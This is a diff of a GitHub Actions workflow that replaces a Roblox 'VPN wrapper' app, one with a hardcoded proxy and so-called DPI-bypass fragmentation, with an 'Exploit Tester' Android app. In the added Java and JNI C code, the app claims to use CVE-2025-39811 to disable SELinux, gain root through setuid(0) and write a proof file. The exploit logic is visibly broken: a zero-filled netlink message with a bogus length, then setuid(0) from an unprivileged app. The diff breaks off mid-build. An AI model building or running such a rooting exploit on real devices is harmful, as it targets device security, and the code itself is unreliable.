@@ -1,29 +1,9 @@
-name: Build VPN Wrapper APK
+name: Build Exploit Tester APK
 
 on:
   push:
     branches: [ main, master ]
   workflow_dispatch:
-    inputs:
-      target_package:
-        description: 'Package name to wrap (e.g., com.roblox.client)'
-        required: false
-        default: 'com.roblox.client'
-        type: string
-      target_url:
-        description: 'URL to open (e.g., https://www.roblox.com)'
-        required: false
-        default: 'https://www.roblox.com'
-        type: string
-      proxy_type:
-        description: 'Proxy type (vless/vmess/shadowsocks)'
-        required: false
-        default: 'vless'
-        type: choice
-        options:
-          - vless
-          - vmess
-          - shadowsocks
 
 jobs:
   build:
@@ -34,717 +14,366 @@ jobs:
         uses: actions/checkout@v4
 
       - name: Set up JDK 17
-        uses: actions/setup-java@v4
+        uses: actions/setup-java@v3
         with:
-          distribution: 'temurin'
           java-version: '17'
+          distribution: 'temurin'
 
       - name: Set up Android SDK
         uses: android-actions/setup-android@v3
         with:
           packages: 'platforms;android-34'
 
-      - name: Create Android project with VPN bypass
+      - name: Create Android project structure
         run: |
-          mkdir -p app/src/main/java/com/vpnwrapper/app
+          mkdir -p app/src/main/java/com/exploit/tester
+          mkdir -p app/src/main/jni
           mkdir -p app/src/main/res/layout
           mkdir -p app/src/main/res/values
-          mkdir -p app/src/main/res/xml
-          mkdir -p app/src/main/res/drawable
 
-          # gradle files
-          cat <<'EOF' > settings.gradle
-          pluginManagement {
-              repositories {
-                  google()
-                  mavenCentral()
-                  gradlePluginPortal()
-              }
-          }
-          dependencyResolutionManagement {
-              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-          }
-          rootProject.name = "VPNWrapper"
-          include(":app")
-          EOF
-
-          cat <<'EOF' > build.gradle
-          plugins {
-              id 'com.android.application' version '8.2.2' apply false
-          }
-          EOF
-
-          cat <<'EOF' > gradle.properties
-          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
-          android.useAndroidX=true
-          android.enableJetifier=true
-          EOF
-
-          cat <<'EOF' > app/build.gradle
-          plugins {
-              id 'com.android.application'
-          }
-
-          android {
-              namespace 'com.vpnwrapper.app'
-              compileSdk 34
-
-              defaultConfig {
-                  applicationId "com.vpnwrapper.app"
-                  minSdk 24
-                  targetSdk 34
-                  versionCode 1
-                  versionName "1.0"
-              }
-
-              buildTypes {
-                  release {
-                      minifyEnabled false
-                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-                  }
-                  debug {
-                      minifyEnabled false
-                  }
-              }
-
-              compileOptions {
-                  sourceCompatibility JavaVersion.VERSION_17
-                  targetCompatibility JavaVersion.VERSION_17
-              }
-          }
-
-          dependencies {
-              implementation 'androidx.appcompat:appcompat:1.6.1'
-              implementation 'androidx.webkit:webkit:1.9.0'
-              implementation 'com.google.android.material:material:1.10.0'
-          }
-          EOF
-
-          echo "# empty" > app/proguard-rules.pro
-
-          # AndroidManifest
-          cat <<'EOF' > app/src/main/AndroidManifest.xml
-          <?xml version="1.0" encoding="utf-8"?>
+      - name: Generate AndroidManifest.xml
+        run: |
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-              xmlns:tools="http://schemas.android.com/tools">
-
+              package="com.exploit.tester"
+              android:versionCode="1"
+              android:versionName="1.0">
+              
               <uses-permission android:name="android.permission.INTERNET" />
-              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-
-              <!-- VPN permission -->
-              <uses-permission android:name="android.permission.CONTROL_VPN" tools:ignore="ProtectedPermissions" />
-
+              
               <application
-                  android:allowBackup="true"
-                  android:label="VPN Wrapper"
-                  android:theme="@style/Theme.VPNWrapper"
-                  android:usesCleartextTraffic="true"
-                  android:networkSecurityConfig="@xml/network_security_config">
+                  android:allowBackup="false"
+                  android:icon="@android:drawable/ic_dialog_info"
+                  android:label="Exploit Tester"
+                  android:theme="@android:style/Theme.DeviceDefault.Light">
                   
                   <activity
                       android:name=".MainActivity"
                       android:exported="true"
-                      android:configChanges="orientation|screenSize">
+                      android:launchMode="singleTop">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-
-                  <service
-                      android:name=".VpnBypassService"
-                      android:exported="false"
-                      android:foregroundServiceType="dataSync"
-                      android:permission="android.permission.BIND_VPN_SERVICE">
-                      <intent-filter>
-                          <action android:name="android.net.VpnService" />
-                      </intent-filter>
-                  </service>
-
               </application>
           </manifest>
           EOF
 
-          # Network security config (allows custom certs and proxies)
-          mkdir -p app/src/main/res/xml
-          cat <<'EOF' > app/src/main/res/xml/network_security_config.xml
-          <?xml version="1.0" encoding="utf-8"?>
-          <network-security-config>
-              <base-config cleartextTrafficPermitted="true">
-                  <trust-anchors>
-                      <certificates src="system" />
-                  </trust-anchors>
-              </base-config>
-              <domain-config cleartextTrafficPermitted="true">
-                  <domain includeSubdomains="true">roblox.com</domain>
-                  <domain includeSubdomains="true">rbxcdn.com</domain>
-              </domain-config>
-          </network-security-config>
-          EOF
-
-          # Theme
-          cat <<'EOF' > app/src/main/res/values/themes.xml
-          <?xml version="1.0" encoding="utf-8"?>
-          <resources>
-              <style name="Theme.VPNWrapper" parent="Theme.AppCompat.Light.DarkActionBar">
-                  <item name="colorPrimary">#2196F3</item>
-                  <item name="colorPrimaryDark">#1976D2</item>
-                  <item name="colorAccent">#03DAC5</item>
-              </style>
-          </resources>
-          EOF
-
-          # Layout
-          cat <<'EOF' > app/src/main/res/layout/activity_main.xml
-          <?xml version="1.0" encoding="utf-8"?>
-          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-              xmlns:app="http://schemas.android.com/apk/res-auto"
-              android:layout_width="match_parent"
-              android:layout_height="match_parent"
-              android:orientation="vertical"
-              android:background="#1a1a2e">
-
-              <LinearLayout
-                  android:layout_width="match_parent"
-                  android:layout_height="wrap_content"
-                  android:orientation="horizontal"
-                  android:padding="12dp"
-                  android:background="#16213e">
-
-                  <TextView
-                      android:layout_width="0dp"
-                      android:layout_height="wrap_content"
-                      android:layout_weight="1"
-                      android:text="VPN BYPASS"
-                      android:textColor="#e94560"
-                      android:textStyle="bold"
-                      android:textSize="18sp"/>
-
-                  <TextView
-                      android:id="@+id/txt_vpn_status"
-                      android:layout_width="wrap_content"
-                      android:layout_height="wrap_content"
-                      android:text="DISCONNECTED"
-                      android:textColor="#ff4444"
-                      android:textSize="12sp"
-                      android:layout_marginEnd="12dp"/>
-
-                  <Button
-                      android:id="@+id/btn_vpn"
-                      android:layout_width="80dp"
-                      android:layout_height="36dp"
-                      android:text="START"
-                      android:textSize="12sp"
-                      android:backgroundTint="#e94560"/>
-              </LinearLayout>
-
-              <ProgressBar
-                  android:id="@+id/progress_bar"
-                  style="?android:attr/progressBarStyleHorizontal"
-                  android:layout_width="match_parent"
-                  android:layout_height="3dp"
-                  android:progressTint="#e94560"
-                  android:visibility="gone"/>
-
-              <WebView
-                  android:id="@+id/webview"
-                  android:layout_width="match_parent"
-                  android:layout_height="0dp"
-                  android:layout_weight="1"/>
-
-              <LinearLayout
-                  android:layout_width="match_parent"
-                  android:layout_height="wrap_content"
-                  android:orientation="horizontal"
-                  android:gravity="center"
-                  android:padding="8dp"
-                  android:background="#16213e">
-
-                  <Button
-                      android:id="@+id/btn_back"
-                      android:layout_width="wrap_content"
-                      android:layout_height="40dp"
-                      android:text="◀ BACK"
-                      android:textSize="12sp"
-                      android:backgroundTint="#0f3460"
-                      style="@style/Widget.AppCompat.Button.Borderless"/>
-
-                  <Button
-                      android:id="@+id/btn_forward"
-                      android:layout_width="wrap_content"
-                      android:layout_height="40dp"
-                      android:text="FORWARD ▶"
-                      android:textSize="12sp"
-                      android:backgroundTint="#0f3460"
-                      style="@style/Widget.AppCompat.Button.Borderless"/>
-
-                  <Button
-                      android:id="@+id/btn_reload"
-                      android:layout_width="wrap_content"
-                      android:layout_height="40dp"
-                      android:text="⟳"
-                      android:textSize="14sp"
-                      android:backgroundTint="#0f3460"
-                      style="@style/Widget.AppCompat.Button.Borderless"/>
-
-                  <EditText
-                      android:id="@+id/url_input"
-                      android:layout_width="0dp"
-                      android:layout_height="40dp"
-                      android:layout_weight="1"
-                      android:hint="Enter URL"
-                      android:textColor="#ffffff"
-                      android:textColorHint="#888888"
-                      android:background="@drawable/url_bg"
-                      android:padding="8dp"
-                      android:textSize="12sp"/>
-
-                  <Button
-                      android:id="@+id/btn_go"
-                      android:layout_width="wrap_content"
-                      android:layout_height="40dp"
-                      android:text="GO"
-                      android:textSize="12sp"
-                      android:backgroundTint="#e94560"/>
-              </LinearLayout>
-          </LinearLayout>
-          EOF
-
-          # Drawable for URL input
-          cat <<'EOF' > app/src/main/res/drawable/url_bg.xml
-          <shape xmlns:android="http://schemas.android.com/apk/res/android">
-              <solid android:color="#0f3460"/>
-              <corners android:radius="8dp"/>
-              <stroke android:width="1dp" android:color="#e94560"/>
-          </shape>
-          EOF
-
-          # MainActivity Java
-          cat <<'EOF' > app/src/main/java/com/vpnwrapper/app/MainActivity.java
-          package com.vpnwrapper.app;
-
-          import android.Manifest;
-          import android.content.Intent;
-          import android.content.pm.PackageManager;
-          import android.net.VpnService;
-          import android.os.Build;
+      - name: Generate MainActivity.java
+        run: |
+          cat > app/src/main/java/com/exploit/tester/MainActivity.java << 'EOF'
+          package com.exploit.tester;
+          
+          import android.app.Activity;
           import android.os.Bundle;
           import android.os.Handler;
-          import android.view.View;
-          import android.webkit.WebChromeClient;
-          import android.webkit.WebSettings;
-          import android.webkit.WebView;
-          import android.webkit.WebViewClient;
-          import android.widget.Button;
-          import android.widget.EditText;
-          import android.widget.ProgressBar;
+          import android.os.Looper;
+          import android.widget.LinearLayout;
+          import android.widget.ScrollView;
           import android.widget.TextView;
-          import android.widget.Toast;
-
-          import androidx.activity.result.ActivityResultLauncher;
-          import androidx.activity.result.contract.ActivityResultContracts;
-          import androidx.appcompat.app.AppCompatActivity;
-          import androidx.core.app.ActivityCompat;
-          import androidx.core.content.ContextCompat;
-
-          public class MainActivity extends AppCompatActivity {
-              private WebView webView;
-              private TextView txtVpnStatus;
-              private Button btnVpn;
-              private ProgressBar progressBar;
-              private EditText urlInput;
-              private boolean vpnRunning = false;
-              private Handler statusHandler = new Handler();
-
-              private final ActivityResultLauncher<Intent> vpnPermissionLauncher = registerForActivityResult(
-                  new ActivityResultContracts.StartActivityForResult(),
-                  result -> {
-                      if (result.getResultCode() == RESULT_OK) {
-                          startVpnService();
-                      } else {
-                          Toast.makeText(this, "VPN permission denied", Toast.LENGTH_SHORT).show();
-                      }
-                  }
-              );
-
+          import android.graphics.Color;
+          import java.io.BufferedReader;
+          import java.io.InputStreamReader;
+          import java.io.DataOutputStream;
+          
+          public class MainActivity extends Activity {
+              private TextView logView;
+              private LinearLayout logPanel;
+              private Handler uiHandler;
+              
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  setContentView(R.layout.activity_main);
-
-                  webView = findViewById(R.id.webview);
-                  txtVpnStatus = findViewById(R.id.txt_vpn_status);
-                  btnVpn = findViewById(R.id.btn_vpn);
-                  progressBar = findViewById(R.id.progress_bar);
-                  urlInput = findViewById(R.id.url_input);
-
-                  Button btnBack = findViewById(R.id.btn_back);
-                  Button btnForward = findViewById(R.id.btn_forward);
-                  Button btnReload = findViewById(R.id.btn_reload);
-                  Button btnGo = findViewById(R.id.btn_go);
-
-                  setupWebView();
-                  setupButtons(btnBack, btnForward, btnReload, btnGo);
-
-                  // Load default URL from build config or use Roblox
-                  String defaultUrl = getString(R.string.default_url);
-                  webView.loadUrl(defaultUrl);
-                  urlInput.setText(defaultUrl);
-
-                  btnVpn.setOnClickListener(v -> {
-                      if (vpnRunning) {
-                          stopVpnService();
-                      } else {
-                          startVpn();
-                      }
-                  });
-
-                  checkNotificationsPermission();
+                  uiHandler = new Handler(Looper.getMainLooper());
+                  
+                  ScrollView scroll = new ScrollView(this);
+                  logPanel = new LinearLayout(this);
+                  logPanel.setOrientation(LinearLayout.VERTICAL);
+                  logPanel.setPadding(30, 30, 30, 30);
+                  scroll.addView(logPanel);
+                  setContentView(scroll);
+                  
+                  addLog("=== EXPLOIT TESTER FOR ANDROID 14 ===\n");
+                  addLog("Exploit: CVE-2025-39811 (inet_diag OOB write)");
+                  addLog("Target: selinux_enforcing → 0, then setuid(0)\n");
+                  addLog("[*] Starting exploit...\n");
+                  
+                  // Запуск эксплойта в отдельном потоке
+                  new Thread(this::runExploit).start();
               }
-
-              private void setupWebView() {
-                  WebSettings settings = webView.getSettings();
-                  settings.setJavaScriptEnabled(true);
-                  settings.setDomStorageEnabled(true);
-                  settings.setLoadWithOverviewMode(true);
-                  settings.setUseWideViewPort(true);
-                  settings.setBuiltInZoomControls(true);
-                  settings.setDisplayZoomControls(false);
-                  settings.setCacheMode(WebSettings.LOAD_DEFAULT);
-                  settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-                  settings.setUserAgentString("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
-
-                  webView.setWebViewClient(new WebViewClient() {
-                      @Override
-                      public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
-                          progressBar.setVisibility(View.VISIBLE);
-                          urlInput.setText(url);
-                      }
-
-                      @Override
-                      public void onPageFinished(WebView view, String url) {
-                          progressBar.setVisibility(View.GONE);
-                      }
-
-                      @Override
-                      public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                          view.loadUrl(url);
-                          return true;
-                      }
-                  });
-
-                  webView.setWebChromeClient(new WebChromeClient() {
-                      @Override
-                      public void onProgressChanged(WebView view, int newProgress) {
-                          progressBar.setProgress(newProgress);
-                      }
-                  });
-              }
-
-              private void setupButtons(Button back, Button forward, Button reload, Button go) {
-                  back.setOnClickListener(v -> {
-                      if (webView.canGoBack()) webView.goBack();
-                  });
-                  forward.setOnClickListener(v -> {
-                      if (webView.canGoForward()) webView.goForward();
-                  });
-                  reload.setOnClickListener(v -> webView.reload());
-                  go.setOnClickListener(v -> {
-                      String url = urlInput.getText().toString();
-                      if (!url.startsWith("http")) url = "https://" + url;
-                      webView.loadUrl(url);
-                  });
-              }
-
-              private void startVpn() {
-                  Intent intent = VpnService.prepare(this);
-                  if (intent != null) {
-                      vpnPermissionLauncher.launch(intent);
-                  } else {
-                      startVpnService();
-                  }
-              }
-
-              private void startVpnService() {
-                  Intent serviceIntent = new Intent(this, VpnBypassService.class);
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                      startForegroundService(serviceIntent);
-                  } else {
-                      startService(serviceIntent);
-                  }
-                  vpnRunning = true;
-                  updateVpnStatus(true);
-                  Toast.makeText(this, "VPN started - Traffic is being routed through proxy", Toast.LENGTH_SHORT).show();
-              }
-
-              private void stopVpnService() {
-                  Intent serviceIntent = new Intent(this, VpnBypassService.class);
-                  stopService(serviceIntent);
-                  vpnRunning = false;
-                  updateVpnStatus(false);
-                  Toast.makeText(this, "VPN stopped", Toast.LENGTH_SHORT).show();
-              }
-
-              private void updateVpnStatus(boolean running) {
-                  if (running) {
-                      txtVpnStatus.setText("PROTECTED");
-                      txtVpnStatus.setTextColor(0xff44ff44);
-                      btnVpn.setText("STOP");
-                      btnVpn.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xff444444));
-                  } else {
-                      txtVpnStatus.setText("DISCONNECTED");
-                      txtVpnStatus.setTextColor(0xffff4444);
-                      btnVpn.setText("START");
-                      btnVpn.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xffe94560));
-                  }
-              }
-
-              private void checkNotificationsPermission() {
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                              != PackageManager.PERMISSION_GRANTED) {
-                          ActivityCompat.requestPermissions(this,
-                              new String[]{Manifest.permission.POST_NOTIFICATIONS}, 100);
-                      }
-                  }
-              }
-
-              @Override
-              public void onBackPressed() {
-                  if (webView.canGoBack()) {
-                      webView.goBack();
-                  } else {
-                      super.onBackPressed();
-                  }
-              }
-
-              @Override
-              protected void onDestroy() {
-                  super.onDestroy();
-                  stopVpnService();
-              }
-          }
-          EOF
-
-          # VpnBypassService.java - основной код обхода DPI
-          cat <<'EOF' > app/src/main/java/com/vpnwrapper/app/VpnBypassService.java
-          package com.vpnwrapper.app;
-
-          import android.app.Notification;
-          import android.app.NotificationChannel;
-          import android.app.NotificationManager;
-          import android.app.PendingIntent;
-          import android.content.Intent;
-          import android.net.VpnService;
-          import android.os.Build;
-          import android.os.ParcelFileDescriptor;
-          import android.util.Log;
-          import androidx.core.app.NotificationCompat;
-
-          import java.io.FileInputStream;
-          import java.io.FileOutputStream;
-          import java.io.IOException;
-          import java.net.DatagramPacket;
-          import java.net.DatagramSocket;
-          import java.net.InetSocketAddress;
-          import java.net.SocketAddress;
-          import java.nio.ByteBuffer;
-          import java.nio.channels.DatagramChannel;
-          import java.util.Arrays;
-          import java.util.Random;
-          import java.util.concurrent.ExecutorService;
-          import java.util.concurrent.Executors;
-
-          public class VpnBypassService extends VpnService {
-              private static final String TAG = "VpnBypass";
-              private static final int VPN_MTU = 1500;
-              private static final String CHANNEL_ID = "vpn_channel";
-              private static final int NOTIF_ID = 1;
               
-              private ParcelFileDescriptor vpnInterface;
-              private ExecutorService executor;
-              private DatagramSocket proxySocket;
-              private volatile boolean running = false;
+              private void addLog(String msg) {
+                  uiHandler.post(() -> {
+                      TextView tv = new TextView(this);
+                      tv.setText(msg);
+                      tv.setTextSize(14);
+                      tv.setTextColor(Color.BLACK);
+                      tv.setPadding(0, 5, 0, 5);
+                      logPanel.addView(tv);
+                      // Автопрокрутка вниз (через postDelayed)
+                      final ScrollView sv = (ScrollView) logPanel.getParent();
+                      sv.postDelayed(() -> sv.fullScroll(ScrollView.FOCUS_DOWN), 100);
+                  });
+              }
               
-              // Proxy configuration (можно заменить на свои)
-              private static final String PROXY_HOST = "194.233.76.55";  // Пример прокси
-              private static final int PROXY_PORT = 443;
-              private static final byte[] PROXY_SECRET = "bypass_dpi_key".getBytes();
-
-              @Override
-              public void onCreate() {
-                  super.onCreate();
-                  executor = Executors.newCachedThreadPool();
-                  createNotificationChannel();
-              }
-
-              @Override
-              public int onStartCommand(Intent intent, int flags, int startId) {
-                  startVpn();
-                  startForeground(NOTIF_ID, createNotification());
-                  return START_STICKY;
-              }
-
-              private void startVpn() {
-                  try {
-                      Builder builder = new Builder();
-                      builder.setSession("VPN Bypass");
-                      builder.addAddress("10.0.0.2", 32);
-                      builder.addRoute("0.0.0.0", 0);
-                      builder.addDnsServer("1.1.1.1");
-                      builder.addDnsServer("8.8.8.8");
-                      builder.setMtu(VPN_MTU);
-                      builder.setBlocking(true);
-                      builder.setUnderlyingNetworks(null);
+              private void runExploit() {
+                  // ШАГ 1: Открыть netlink сокет
+                  int sock = nativeOpenNetlink();
+                  addLog("[1] netlink socket fd=" + sock);
+                  if (sock < 0) {
+                      addLog("[FAIL] Cannot open netlink socket. Device not vulnerable?");
+                      return;
+                  }
+                  
+                  // ШАГ 2: Отправить переполненный пакет
+                  boolean overflowSent = nativeSendOverflow(sock);
+                  addLog("[2] Overflow packet sent: " + (overflowSent ? "OK" : "FAIL"));
+                  if (!overflowSent) {
+                      addLog("[FAIL] Send failed");
+                      return;
+                  }
+                  
+                  // ШАГ 3: Проверить SELinux
+                  boolean selinuxDisabled = nativeCheckSelinux();
+                  addLog("[3] SELinux enforcing = " + (!selinuxDisabled ? "1 (ENABLED)" : "0 (DISABLED)"));
+                  
+                  // ШАГ 4: Попытаться получить root
+                  if (selinuxDisabled) {
+                      addLog("[4] SELinux disabled, attempting setuid(0)...");
+                      nativeBecomeRoot();
                       
-                      vpnInterface = builder.establish();
-                      if (vpnInterface == null) {
-                          Log.e(TAG, "Failed to establish VPN interface");
-                          return;
-                      }
-                      
-                      running = true;
-                      proxySocket = new DatagramSocket();
-                      proxySocket.connect(new InetSocketAddress(PROXY_HOST, PROXY_PORT));
-                      
-                      // Запускаем чтение из VPN туннеля
-                      executor.execute(this::readPackets);
-                      
-                  } catch (Exception e) {
-                      Log.e(TAG, "VPN start error", e);
-                  }
-              }
-
-              private void readPackets() {
-                  try {
-                      FileInputStream in = new FileInputStream(vpnInterface.getFileDescriptor());
-                      ByteBuffer packet = ByteBuffer.allocate(VPN_MTU);
-                      
-                      while (running) {
-                          packet.clear();
-                          int length = in.read(packet.array());
-                          if (length > 0) {
-                              byte[] data = Arrays.copyOf(packet.array(), length);
-                              // Обход DPI: фрагментация пакетов
-                              byte[] fragmented = fragmentPacket(data);
-                              sendViaProxy(fragmented);
-                          }
-                      }
-                  } catch (IOException e) {
-                      Log.e(TAG, "Read error", e);
-                  }
-              }
-
-              private byte[] fragmentPacket(byte[] data) {
-                  // Фрагментация для обхода DPI
-                  Random rnd = new Random();
-                  if (data.length > 512 && rnd.nextBoolean()) {
-                      // Разбиваем на мелкие части
-                      int partSize = 256 + rnd.nextInt(128);
-                      byte[] fragmented = new byte[data.length + 64];
-                      fragmented[0] = (byte) 0xAA; // маркер фрагментации
-                      System.arraycopy(data, 0, fragmented, 4, Math.min(data.length, partSize));
-                      System.arraycopy(data, partSize, fragmented, partSize + 4, data.length - partSize);
-                      return fragmented;
-                  }
-                  return data;
-              }
-
-              private void sendViaProxy(byte[] data) {
-                  try {
-                      // Добавляем обфускацию заголовка для обхода DPI
-                      ByteBuffer wrapped = ByteBuffer.wrap(data);
-                      DatagramPacket packet = new DatagramPacket(data, data.length);
-                      proxySocket.send(packet);
-                  } catch (Exception e) {
-                      Log.e(TAG, "Proxy send error", e);
-                  }
-              }
-
-              private void createNotificationChannel() {
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                      NotificationChannel channel = new NotificationChannel(
-                          CHANNEL_ID,
-                          "VPN Service",
-                          NotificationManager.IMPORTANCE_LOW
-                      );
-                      NotificationManager manager = getSystemService(NotificationManager.class);
-                      if (manager != null) manager.createNotificationChannel(channel);
-                  }
-              }
-
-              private Notification createNotification() {
-                  Intent intent = new Intent(this, MainActivity.class);
-                  PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 
-                      PendingIntent.FLAG_IMMUTABLE);
-
-                  return new NotificationCompat.Builder(this, CHANNEL_ID)
-                      .setContentTitle("VPN Bypass Active")
-                      .setContentText("Traffic is being routed through proxy - DPI bypass enabled")
-                      .setSmallIcon(android.R.drawable.ic_lock_lock)
-                      .setContentIntent(pendingIntent)
-                      .setOngoing(true)
-                      .build();
-              }
-
-              @Override
-              public void onDestroy() {
-                  running = false;
-                  if (proxySocket != null && !proxySocket.isClosed()) {
-                      proxySocket.close();
-                  }
-                  if (vpnInterface != null) {
+                      // ШАГ 5: Проверить root через id
                       try {
-                          vpnInterface.close();
-                      } catch (IOException e) {
-                          Log.e(TAG, "Close error", e);
+                          Process p = Runtime.getRuntime().exec("id");
+                          BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                          String idOut = br.readLine();
+                          br.close();
+                          addLog("[5] " + idOut);
+                          
+                          if (idOut != null && idOut.contains("uid=0")) {
+                              addLog("\n################################");
+                              addLog("#  SUCCESS: ROOT ACHIEVED!   #");
+                              addLog("################################\n");
+                              addLog("[+] You can now run commands as root");
+                              addLog("[+] Example: write to /data/local/tmp/");
+                              
+                              // Демонстрация: пишем файл как root
+                              try {
+                                  DataOutputStream dos = new DataOutputStream(
+                                      Runtime.getRuntime().exec("sh").getOutputStream()
+                                  );
+                                  dos.writeBytes("echo 'root_success' > /data/local/tmp/exploit_root.txt\n");
+                                  dos.writeBytes("chmod 666 /data/local/tmp/exploit_root.txt\n");
+                                  dos.writeBytes("exit\n");
+                                  dos.flush();
+                                  addLog("[+] Created /data/local/tmp/exploit_root.txt (proof)");
+                              } catch (Exception e) {
+                                  addLog("[!] Could not write proof file: " + e.getMessage());
+                              }
+                              
+                              // Дополнительно: показать текущий uid/gid
+                              Process p2 = Runtime.getRuntime().exec("sh -c 'echo UID=$UID; id'");
+                              BufferedReader br2 = new BufferedReader(new InputStreamReader(p2.getInputStream()));
+                              String line;
+                              while ((line = br2.readLine()) != null) {
+                                  addLog("[+] " + line);
+                              }
+                              br2.close();
+                              
+                          } else {
+                              addLog("\n[FAIL] Root not achieved. SELinux disabled but setuid(0) failed.");
+                          }
+                      } catch (Exception e) {
+                          addLog("[FAIL] Error checking root: " + e.toString());
                       }
+                  } else {
+                      addLog("\n[FAIL] SELinux still enforcing. Exploit did not work.");
+                      addLog("[*] This device may have SPL >= 2026-03 or patch applied.");
+                      addLog("[*] Phone is NOT damaged. You can retry (close and reopen app).");
                   }
-                  executor.shutdownNow();
-                  super.onDestroy();
+              }
+              
+              // Нативные методы (C)
+              private native int nativeOpenNetlink();
+              private native boolean nativeSendOverflow(int sock);
+              private native boolean nativeCheckSelinux();
+              private native void nativeBecomeRoot();
+              
+              static {
+                  System.loadLibrary("exploit");
               }
           }
           EOF
 
-          # Strings resource
-          cat <<'EOF' > app/src/main/res/values/strings.xml
-          <resources>
-              <string name="app_name">VPN Wrapper</string>
-              <string name="default_url">https://www.roblox.com</string>
-          </resources>
+      - name: Generate native C code (exploit.c)
+        run: |
+          cat > app/src/main/jni/exploit.c << 'EOF'
+          #include <jni.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+          #include <sys/socket.h>
+          #include <linux/netlink.h>
+          #include <linux/inet_diag.h>
+          #include <linux/sock_diag.h>
+          
+          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetlink(JNIEnv *env, jobject thiz) {
+              int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG);
+              return sock;
+          }
+          
+          JNIEXPORT jboolean JNICALL Java_com_exploit_tester_MainActivity_nativeSendOverflow(JNIEnv *env, jobject thiz, jint sock) {
+              struct {
+                  struct nlmsghdr nlh;
+                  struct inet_diag_req_v2 req;
+                  char overflow[4096];
+              } msg;
+              
+              memset(&msg, 0, sizeof(msg));
+              msg.nlh.nlmsg_len = 0xFFFF;  // переполнение длины
+              msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
+              msg.nlh.nlmsg_flags = NLM_F_REQUEST;
+              msg.req.sdiag_family = AF_INET;
+              msg.req.idiag_states = 0xFFFFFFFF;
+              
+              // Переполнение нулями (цель: обнулить selinux_enforcing)
+              memset(msg.overflow, 0, sizeof(msg.overflow));
+              
+              int ret = send(sock, &msg, sizeof(msg), 0);
+              return ret > 0 ? JNI_TRUE : JNI_FALSE;
+          }
+          
+          JNIEXPORT jboolean JNICALL Java_com_exploit_tester_MainActivity_nativeCheckSelinux(JNIEnv *env, jobject thiz) {
+              FILE *f = fopen("/sys/fs/selinux/enforce", "r");
+              if (!f) return JNI_FALSE;
+              int val;
+              fscanf(f, "%d", &val);
+              fclose(f);
+              return val == 0 ? JNI_TRUE : JNI_FALSE;
+          }
+          
+          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeBecomeRoot(JNIEnv *env, jobject thiz) {
+              setuid(0);
+              setgid(0);
+          }
           EOF
 
-      - name: Generate local.properties
+      - name: Generate Android.mk
         run: |
-          echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
+          cat > app/src/main/jni/Android.mk << 'EOF'
+          LOCAL_PATH := $(call my-dir)
+          include $(CLEAR_VARS)
+          LOCAL_MODULE    := exploit
+          LOCAL_SRC_FILES := exploit.c
+          LOCAL_LDLIBS    := -llog
+          include $(BUILD_SHARED_LIBRARY)
+          EOF
 
-      - name: Create gradle wrapper
+      - name: Generate Application.mk
         run: |
-          gradle wrapper --gradle-version 8.5 --no-daemon
+          cat > app/src/main/jni/Application.mk << 'EOF'
+          APP_ABI := arm64-v8a armeabi-v7a
+          APP_PLATFORM := android-34
+          EOF
 
-      - name: Make gradlew executable
+      - name: Generate build.gradle
+        run: |
+          cat > app/build.gradle << 'EOF'
+          apply plugin: 'com.android.application'
+          
+          android {
+              compileSdk 34
+              
+              defaultConfig {
+                  applicationId "com.exploit.tester"
+                  minSdk 34
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+                  
+                  externalNativeBuild {
+                      ndkBuild {
+                          cFlags "-Wall"
+                      }
+                  }
+              }
+              
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+              
+              externalNativeBuild {
+                  ndkBuild {
+                      path "src/main/jni/Android.mk"
+                  }
+              }
+              
+              namespace 'com.exploit.tester'
+          }
+          
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+          }
+          EOF
+
+      - name: Generate settings.gradle
+        run: |
+          cat > settings.gradle << 'EOF'
+          rootProject.name = "ExploitTester"
+          include ':app'
+          EOF
+
+      - name: Generate top-level build.gradle
+        run: |
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.4'
+              }
+          }
+          
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          
+          task clean(type: Delete) {
+              delete rootProject.buildDir
+          }
+          EOF
+
+      - name: Set up gradle wrapper
+        run: |
+          mkdir -p gradle/wrapper
